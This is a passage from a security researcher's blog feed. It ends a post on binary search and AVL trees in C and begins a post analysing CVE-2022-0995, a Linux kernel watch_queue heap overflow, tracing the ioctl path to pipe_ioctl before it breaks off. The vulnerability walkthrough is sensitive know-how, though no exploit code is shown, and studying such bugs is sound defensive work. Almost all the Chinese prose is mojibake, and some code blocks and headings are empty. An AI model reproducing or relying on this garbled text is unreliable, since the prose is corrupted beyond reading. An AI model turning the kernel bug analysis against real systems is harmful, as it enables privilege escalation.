 replayer = dst-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// both children exist</span></span><br><span class="line">    &#123;</span><br><span class="line">        successor = findSuccessor(dst);</span><br><span class="line">        successor_parent = findParent(tree, successor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dst != successor_parent) <span class="comment">// successor in dst&#x27;s right tree</span></span><br><span class="line">        &#123;</span><br><span class="line">            successor_parent-&gt;left = successor-&gt;right;</span><br><span class="line">            successor-&gt;right = dst-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        successor-&gt;left = dst-&gt;left;</span><br><span class="line">        replayer = successor;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// replace x</span></span><br><span class="line">    <span class="keyword">if</span> (!dst_parent)</span><br><span class="line">        tree-&gt;root = replayer;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dst == dst_parent-&gt;left)</span><br><span class="line">        dst_parent-&gt;left = replayer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dst_parent-&gt;right = replayer;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-AVLæ ‘"><a href="#0x02-AVLæ ‘" class="headerlink" title="0x02. AVLæ ‘"></a>0x02. AVLæ ‘</h1><p><strong>AVLæ ‘</strong>ï¼ˆAdelson-Velsky and Landis Treeï¼‰æ˜¯ä¸€ç§<strong>è‡ªå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘</strong>ï¼Œå…¶ä¼šåœ¨æ’å…¥ä¸åˆ é™¤èŠ‚ç‚¹çš„è¿‡ç¨‹ä¸­ä¿æŒè‡ªèº«çš„ä¸€ç§å¹³è¡¡ï¼Œç”±äºè¿™ä¸ªæ€§è´¨ï¼Œå…¶ä¹Ÿè¢«ç§°ä¸º <em>é«˜åº¦å¹³è¡¡æ ‘</em> ï¼Œå…¶æ€§è´¨ä¸ºï¼š</p><ul><li><strong>AVL æ ‘ä»»ä¸€èŠ‚ç‚¹å¯¹åº”çš„ä¸¤æ£µå­æ ‘çš„æœ€å¤§é«˜åº¦å·®ä¸º 1</strong></li></ul><p>AVL æ ‘æœ€åˆæ˜¯è¢«å‘æ˜æ¥è§£å†³äºŒå‰æŸ¥æ‰¾æ ‘åœ¨ç»è¿‡å¤šæ¬¡æ“ä½œåå‡ºç°çš„ä¸å¹³è¡¡çš„æƒ…å†µï¼Œä¾‹å¦‚ä¸‹å›¾è¿™ç§æƒ…å†µï¼Œè™½ç„¶å…¶ä»æ˜¯ä¸€æ£µäºŒå‰æŸ¥æ‰¾æ ‘ï¼Œä½†æ˜¯ç”±äºå…¶ç»“æ„çš„ä¸å¹³è¡¡ï¼Œå¯¼è‡´æŸ¥æ‰¾çš„æ•ˆç‡å¤§å¹…é™ä½</p><p><img src="https://s2.loli.net/2022/05/28/eApM78arnTuOZb6.png" alt="image.png"></p><blockquote><p>æ¯”å¦‚è¯´ä½ è¦æŸ¥æ‰¾æœ€å·¦è¾¹çš„é‚£ä¸€éƒ¨åˆ†èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ—¶å€™äºŒå‰æœç´¢æ ‘å°±é€€åŒ–æˆä¸€ä¸ªæ•°ç»„äº†ï¼Œæ—¶é—´å¤æ‚åº¦ç›´æ¥å¢é•¿åˆ° <code>O(N)</code>ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çœ‹åˆ°çš„</p></blockquote><p>AVL æ ‘ <strong>é€šè¿‡åœ¨å¢åŠ ä¸åˆ é™¤å…ƒç´ æ—¶è¿›è¡Œä¸€æ¬¡æˆ–å¤šæ¬¡æ—‹è½¬æ“ä½œæ¥å®ç°æ ‘çš„é‡æ–°å¹³è¡¡</strong>ï¼Œå…¶æŸ¥æ‰¾ã€æ’å…¥ã€åˆ é™¤æ“ä½œåœ¨å¹³å‡ä¸æœ€åæƒ…å†µä¸‹çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ <code>O(logN)</code></p><h2 id="Pre-AVL-æ ‘èŠ‚ç‚¹å®šä¹‰"><a href="#Pre-AVL-æ ‘èŠ‚ç‚¹å®šä¹‰" class="headerlink" title="Pre. AVL æ ‘èŠ‚ç‚¹å®šä¹‰"></a>Pre. AVL æ ‘èŠ‚ç‚¹å®šä¹‰</h2><p>è¿™é‡Œæˆ‘ä»¬ä¸ºèŠ‚ç‚¹å¼•å…¥ä¸€ä¸ªæ–°çš„æˆå‘˜â€”â€”<code>é«˜åº¦</code>ï¼š<strong>ç”±æ ¹èŠ‚ç‚¹åˆ°å…¶å·¦å³å­æ ‘çš„ã€æœ€å¤§ã€‘æ·±åº¦</strong></p><p>é«˜åº¦æ˜¯æˆ‘ä»¬å¯¹æ ‘è¿›è¡Œé‡æ„ä½¿å…¶é‡æ–°æˆä¸º AVL æ ‘çš„ä¾æ®ï¼Œæˆ‘ä»¬åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸­è®°å½•ä¸‹è¯¥èŠ‚ç‚¹çš„é«˜åº¦ï¼Œå¹¶åœ¨æ¯æ¬¡æ“ä½œæ—¶è¿›è¡ŒåŠ¨æ€æ›´æ–°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span>key;</span><br><span class="line">    <span class="type">size_t</span>height;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œæˆ‘ä»¬åº”å½“æœ‰ä¸€ä¸ªç”¨ä»¥è®¡ç®—ä¸€æ£µæ ‘çš„é«˜åº¦çš„æ–¹æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ—‹è½¬æ“ä½œ"><a href="#æ—‹è½¬æ“ä½œ" class="headerlink" title="æ—‹è½¬æ“ä½œ"></a>æ—‹è½¬æ“ä½œ</h2><p>è¿™é‡Œæˆ‘ä»¬å¼•å…¥ä¸€ä¸ªæ–°çš„æ“ä½œâ€”â€”<strong>æ—‹è½¬</strong>ï¼ˆrotationï¼‰ï¼Œè¿™æ˜¯ç»„æˆæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ’å…¥&#x2F;åˆ é™¤æ“ä½œä¸­çš„ä¸€ä¸ª<strong>å­æ“ä½œ</strong>ï¼Œæˆ‘ä»¬é€šè¿‡å•æ¬¡&#x2F;å¤šæ¬¡æ—‹è½¬æ“ä½œæ¥ä¿æŒ AVL æ ‘çš„é«˜åº¦å¹³è¡¡çš„ç‰¹æ€§</p><p>ä¸‹å›¾æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„æ—‹è½¬çš„ä¾‹å­ï¼Œé€šè¿‡æ—‹è½¬ä½¿å¾—ä¸€æ£µæ ‘é‡æ–°æˆä¸º AVL æ ‘</p><p><img src="https://s2.loli.net/2022/05/29/4aCjEhDTUkHZibs.gif" alt="260px-AVL_Tree_Example.gif"></p><h3 id="å·¦æ—‹"><a href="#å·¦æ—‹" class="headerlink" title="å·¦æ—‹"></a>å·¦æ—‹</h3><h3 id="å³æ—‹"><a href="#å³æ—‹" class="headerlink" title="å³æ—‹"></a>å³æ—‹</h3><h2 id="æ’å…¥èŠ‚ç‚¹-1"><a href="#æ’å…¥èŠ‚ç‚¹-1" class="headerlink" title="æ’å…¥èŠ‚ç‚¹"></a>æ’å…¥èŠ‚ç‚¹</h2><h2 id="åˆ é™¤èŠ‚ç‚¹-1"><a href="#åˆ é™¤èŠ‚ç‚¹-1" class="headerlink" title="åˆ é™¤èŠ‚ç‚¹"></a>åˆ é™¤èŠ‚ç‚¹</h2><h1 id="0x03-2-3-4æ ‘"><a href="#0x03-2-3-4æ ‘" class="headerlink" title="0x03. 2-3-4æ ‘"></a>0x03. 2-3-4æ ‘</h1><h1 id="0x04-çº¢é»‘æ ‘"><a href="#0x04-çº¢é»‘æ ‘" class="headerlink" title="0x04. çº¢é»‘æ ‘"></a>0x04. çº¢é»‘æ ‘</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†&lt;/p&gt;</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x08ã€‘CVE-2022-0995 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2022-0995 æ˜¯è¿‘æ—¥çˆ†å‡ºæ¥çš„ä¸€ä¸ªå­˜åœ¨äº _è§‚å¯Ÿé˜Ÿåˆ—äº‹ä»¶é€šçŸ¥å­ç³»ç»Ÿ_ï¼ˆwatch_queue event notification subsystemï¼‰ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œè¯¥æ¼æ´è‡ªå†…æ ¸ç‰ˆæœ¬ <code>5.8</code> ä¸­ä¼´éšç€ watch queue subsystem å¼•å…¥ï¼Œåœ¨ <code>5.17-rc7</code> ç‰ˆæœ¬ä¸­è¢«ä¿®å¤</p><p>ä¸è¿‡è™½ç„¶è·å¾—äº† <code>7.1</code> çš„ CVSS è¯„åˆ†ï¼Œä½†è¿™ä¸ªæ¼æ´ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆçƒ­åº¦ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥è¿™ä»ç„¶æ˜¯ä¸€ä¸ªå“ç›¸ä¸é”™çš„æ¼æ´</p><p>åœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="General-notification-mechanism"><a href="#General-notification-mechanism" class="headerlink" title="General notification mechanism"></a><em>General notification mechanism</em></h2><blockquote><p>å‚è§<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>é€šç”¨é€šçŸ¥æœºåˆ¶</em> æ˜¯å»ºç«‹åœ¨æ ‡å‡†ç®¡é“é©±åŠ¨ä¹‹ä¸Šçš„ï¼Œå…¶å¯ä»¥æœ‰æ•ˆåœ°å°†æ¥è‡ªå†…æ ¸çš„é€šçŸ¥æ¶ˆæ¯æ‹¼æ¥åˆ°ç”¨æˆ·æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>CONFIG_WATCH_QUEUE</code> ç¼–è¯‘é€‰é¡¹å¯ç”¨ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p><p>è¯¥æœºåˆ¶é€šè¿‡ä¸€ä¸ªä»¥ç‰¹æ®Šæ¨¡å¼æ‰“å¼€çš„ç®¡é“å®ç°ï¼Œå†…æ ¸ç”Ÿæˆçš„æ¶ˆæ¯è¢«ä¿å­˜åˆ°ç®¡é“å†…éƒ¨çš„å¾ªç¯ç¯å½¢ç¼“å†²åŒºä¸­ï¼ˆ<code>pipe_buffer</code> é˜Ÿåˆ—ï¼‰ï¼Œé€šè¿‡ <code>read()</code> è¿›è¡Œè¯»å–ï¼Œç”±äºåœ¨æŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æƒ³è¦å°†æ·»åŠ çš„å†…å®¹è¿˜åŸåˆ°ç¯ä¸Šï¼Œå› æ­¤åœ¨æ­¤ç±»ç®¡é“ä¸Šç¦ç”¨äº† splice ä»¥åŠç±»ä¼¼åŠŸèƒ½ï¼ˆå› ä¸ºè¿™å¯èƒ½å¯¼è‡´å…¶ä¸é€šçŸ¥æ¶ˆæ¯äº¤ç»‡åœ¨ä¸€èµ·ï¼‰</p><p>ç®¡é“çš„æ‰€æœ‰è€…åº”å½“å‘Šè¯‰å†…æ ¸å“ªäº›èµ„æºå…¶æƒ³è¦é€šè¿‡è¯¥ç®¡é“è¿›è¡Œè§‚å¯Ÿï¼Œåªæœ‰è¿æ¥åˆ°è¯¥ç®¡é“ä¸Šçš„èµ„æºæ‰ä¼šå¾€é‡Œè¾¹æ’å…¥æ¶ˆæ¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªèµ„æºå¯èƒ½ä¼šä¸å¤šä¸ªç®¡é“ç»‘å®šå¹¶åŒæ—¶å°†æ¶ˆæ¯æ’å…¥æ‰€æœ‰ç®¡é“</p><p>è‹¥ç¯ä¸­æ²¡æœ‰å¯ç”¨çš„æ’æ§½æˆ–å¯ç”¨çš„é¢„åˆ†é…çš„ message bufferï¼ˆä¸€ä¸ªç®¡é“é»˜è®¤åªæœ‰ 16 ä¸ª <code>pipe_buffer</code> â€”â€”å¯¹åº” 16 å¼ å†…å­˜é¡µï¼‰ï¼Œåˆ™æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œ<code>read()</code> å°†åœ¨è¯»å–å½“å‰ç¼“å†²åŒºçš„æœ€åä¸€æ¡æ¶ˆæ¯åå°† <code>WATCH_META_LOSS_NOTIFICATION</code> æ’å…¥è¾“å‡ºç¼“å†²åŒº</p><h3 id="Watch-Queueï¼ˆNotification-Outputï¼‰API"><a href="#Watch-Queueï¼ˆNotification-Outputï¼‰API" class="headerlink" title="Watch Queueï¼ˆNotification Outputï¼‰API"></a>Watch Queueï¼ˆNotification Outputï¼‰API</h3><p>ä¸€ä¸ª <em>è§‚æµ‹é˜Ÿåˆ—</em> ï¼ˆwatch queueï¼‰æ˜¯ç”±ä¸€ä¸ªåº”ç”¨åˆ†é…çš„ç”¨ä»¥è®°å½•é€šçŸ¥çš„ç¼“å†²åŒºï¼Œå…¶å·¥ä½œåŸç†å®Œå…¨éšè—åœ¨ç®¡é“è®¾å¤‡é©±åŠ¨ä¸­ï¼Œä½†æœ‰å¿…è¦è·å¾—ä¸€ä¸ªå¯¹å…¶çš„å¼•ç”¨ä»¥è®¾ç½®ä¸€ä¸ªè§‚æµ‹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ API è¿›è¡Œç®¡ç†ï¼š</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>ç”±äºè§‚æµ‹é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­é€šè¿‡å®ç°ç¼“å†²åŒºçš„ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ç¤ºï¼Œç”¨æˆ·ç©ºé—´å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨ä¼ é€’è¯¥æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¯ä»¥ç”¨äºä»ç³»ç»Ÿè°ƒç”¨ä¸­æŸ¥æ‰¾æŒ‡å‘è§‚æµ‹é˜Ÿåˆ—çš„ä¸é€æ˜æŒ‡é’ˆ</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>è¯¥å‡½æ•°ç”¨ä»¥ä¸¢å¼ƒä» <code>get_watch_queue()</code> è·å¾—çš„å¼•ç”¨</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>å½“ä¸€ä¸ªè§‚æµ‹é˜Ÿåˆ—è¢«åˆ›å»ºåï¼Œæˆ‘ä»¬å¯ä»¥åº”ç”¨ä¸€ç»„ <em>è¿‡æ»¤å™¨</em> ï¼ˆfiltersï¼‰ä»¥é™åˆ¶æ¥æ”¶çš„äº‹ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ filter åº”ä¸ºä¸€ä¸ª <code>struct watch_notification_filter</code> ç±»å‹å˜é‡ï¼Œå…¶ä¸­ <code>nr_filters</code> è¡¨ç¤º <code>filters[]</code> æ•°ç»„ä¸­è¿‡æ»¤å™¨çš„æ•°é‡ï¼Œè€Œ <code>__reserved</code> åº”ä¸º 0ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">        __u32   nr_filters;</span><br><span class="line">        __u32   __reserved;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>filters[]</code> ä¸ºä¸€ä¸ª <code>watch_notification_type_filter</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">        __u32   type;</span><br><span class="line">        __u32   info_filter;</span><br><span class="line">        __u32   info_mask;</span><br><span class="line">        __u32   subtype_filter[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><code>type</code> ä¸ºè¦è¿‡æ»¤çš„äº‹ä»¶ç±»å‹ï¼Œåº”å½“ä¸ºç±»ä¼¼ <code>WATCH_TYPE_KEY_NOTIFY</code> çš„å€¼</p></li><li><p><code>info_filter</code> ä¸ <code>info_mask</code> å……å½“é€šçŸ¥è®°å½•çš„ä¿¡æ¯å­—æ®µçš„è¿‡æ»¤å™¨ï¼Œä»…åœ¨ä»¥ä¸‹æƒ…å†µæ‰å°†é€šçŸ¥å†™å…¥ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¿™å¯ä»¥ç”¨äºå¿½ç•¥ä¸åœ¨ä¸€ä¸ªæŒ‚è½½æ ‘ä¸Šçš„è§‚æµ‹ç‚¹çš„äº‹ä»¶</p></li><li><p><code>subtype_filter</code> ä¸ºä¸€ä¸ªæŒ‡ç¤ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„å­ç±»å‹çš„ bitmaskï¼Œ<code>subtype_filter[0]</code> çš„ 0 ä½å¯¹åº”å­ç±»å‹ 0ï¼Œ1 ä½å¯¹åº”å­ç±»å‹ 1ï¼Œä»¥æ­¤ç±»æ¨</p></li></ul><p>è‹¥ ioctl() çš„å‚æ•°ä¸º NULLï¼Œåˆ™è¿‡æ»¤å™¨å°†è¢«ç§»é™¤ï¼Œæˆ‘ä»¬å°†æ¥æ”¶åˆ°æ‰€æœ‰æ¥è‡ªè§‚æµ‹æºçš„äº‹ä»¶</p><h2 id="å†…æ ¸ä¸­-watch-queue-subsystem-ä¸­-Event-Filter-çš„å®ç°"><a href="#å†…æ ¸ä¸­-watch-queue-subsystem-ä¸­-Event-Filter-çš„å®ç°" class="headerlink" title="å†…æ ¸ä¸­ watch queue subsystem ä¸­ Event Filter çš„å®ç°"></a>å†…æ ¸ä¸­ watch queue subsystem ä¸­ Event Filter çš„å®ç°</h2><p>å‰é¢æˆ‘ä»¬æŠ„äº†ä¸€å¤§æ®µçš„ kernel documentï¼Œç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥æºç çœ‹ä¸€ä¸‹ watch queue subsystem çš„å®ç°æœºåˆ¶</p><p>å½“æˆ‘ä»¬è°ƒç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> æ—¶ï¼Œä¼šè°ƒç”¨ <code>do_vfs_ioctl()</code> åˆ¤æ–­ cmd è¿›è¡Œå¤„ç†ï¼Œè€Œæˆ‘ä»¬çš„ <code>IOC_WATCH_QUEUE_SET_FILTER</code> ä¸åœ¨å…¶åˆ—è¡¨ä¸­ï¼Œæ‰€ä»¥æœ€åä¼šèµ°åˆ° <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, cmd, <span class="type">unsigned</span> <span class="type">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>vfs_ioctl()</code> ä¸­ä¼šè°ƒç”¨ file ç»“æ„ä½“è‡ªèº«çš„å‡½æ•°è¡¨ä¸­çš„ <code>unlocked_ioctl</code> æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ç›®å…‰æ”¾å›ç®¡é“çš„åˆ›å»ºæµç¨‹ä¸­åˆ†é…æ–‡ä»¶æè¿°ç¬¦çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">    __do_pipe_flags()</span><br><span class="line">    create_pipe_files()</span><br><span class="line">    alloc_file_pseudo()</span><br><span class="line">    alloc_file()</span><br></pre></td></tr></table></figure><p><code>alloc_file()</code> åˆ†é…ä¸€ä¸ª file ç»“æ„ä½“å¹¶å°†å…¶å‡½æ•°è¡¨è®¾ä¸ºä¸Šå±‚è°ƒç”¨ä¼ å…¥çš„å‡½æ•°è¡¨ï¼Œè€Œåœ¨ <code>create_pipe_files()</code> ä¸­ä¼ å…¥çš„å‡½æ•°è¡¨ä¸º <code>pipefifo_fops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› æ­¤æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯ <code>pipe_ioctl()</code>ï¼Œå¯¹äº cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> è€Œè¨€ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ <code>watch_queue_set_filter()</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> 